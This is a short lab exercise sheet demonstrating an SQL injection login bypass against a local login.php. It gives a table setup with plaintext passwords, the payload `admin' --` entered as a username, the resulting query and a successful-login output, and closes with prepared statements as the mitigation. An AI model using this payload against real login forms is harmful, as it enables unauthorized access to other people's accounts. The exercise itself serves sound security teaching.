# ex01 - SQL Injection

## Aim
Demonstrate an SQL injection attack and its impact.

## Setup
```sql
CREATE TABLE users (
  id INT AUTO_INCREMENT PRIMARY KEY,
  username VARCHAR(50) NOT NULL,
  password VARCHAR(50) NOT NULL
);
INSERT INTO users (username, password) VALUES ('admin','admin123'),('user','user123');
```
Serve `login.php` with XAMPP/WAMP.

## Attack
- Username: `admin' --`
- Password: (blank)

The query becomes:
```sql
SELECT * FROM users WHERE username='admin' --' AND password='';
```
`--` comments out the password check.

## Output
```
Login Successful!
```

## Mitigation
Use prepared statements (`mysqli::prepare`) instead of string concatenation.
